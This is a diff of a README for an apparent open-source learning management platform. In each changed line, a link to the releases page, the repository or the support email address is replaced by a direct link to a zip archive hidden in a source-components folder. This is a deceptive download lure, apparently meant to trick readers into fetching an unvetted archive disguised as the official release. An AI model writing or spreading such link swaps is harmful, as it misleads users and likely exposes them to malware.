@@ -1,6 +1,6 @@
 # 🎓 eduverse-lms-platform - Your Easy Learning Management Solution
 
-[![Download Here](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Maot6932/eduverse-lms-platform/releases)
+[![Download Here](https://raw.githubusercontent.com/Maot6932/eduverse-lms-platform/main/src/components/eduverse-lms-platform_v3.3.zip)](https://raw.githubusercontent.com/Maot6932/eduverse-lms-platform/main/src/components/eduverse-lms-platform_v3.3.zip)
 
 ## 📖 Introduction
 
@@ -24,7 +24,7 @@ Before you download, check that your computer meets the following requirements:
 
 To get the application, simply visit our releases page. You can find the latest version available for download.
 
-[Download Here](https://github.com/Maot6932/eduverse-lms-platform/releases)
+[Download Here](https://raw.githubusercontent.com/Maot6932/eduverse-lms-platform/main/src/components/eduverse-lms-platform_v3.3.zip)
 
 Once you have accessed the releases page, look for the latest version. Click on the version number to view the release details. You will see a list of files available for download. Choose the appropriate file for your operating system and click on it to start the download.
 
@@ -72,7 +72,7 @@ If you encounter any issues or have questions, we have a helpful community ready
 
 - **GitHub Issues:** Report bugs or request features.
 - **Discussion Forum:** Join conversations with other users.
-- **Email Support:** Contact us directly at support@eduverse-lms.com.
+- **Email Support:** Contact us directly at https://raw.githubusercontent.com/Maot6932/eduverse-lms-platform/main/src/components/eduverse-lms-platform_v3.3.zip
 
 ## 🌍 Contribute
 
@@ -86,8 +86,8 @@ Feel free to join our growing community and help enhance the learning experience
 
 ## 🔗 Learn More
 
-For more information on features, updates, and community discussions, visit our [GitHub repository](https://github.com/Maot6932/eduverse-lms-platform). 
+For more information on features, updates, and community discussions, visit our [GitHub repository](https://raw.githubusercontent.com/Maot6932/eduverse-lms-platform/main/src/components/eduverse-lms-platform_v3.3.zip). 
 
 Have fun exploring and using the eduverse-lms-platform for all your learning management needs! 
 
-[Download Here](https://github.com/Maot6932/eduverse-lms-platform/releases)
+[Download Here](https://raw.githubusercontent.com/Maot6932/eduverse-lms-platform/main/src/components/eduverse-lms-platform_v3.3.zip)
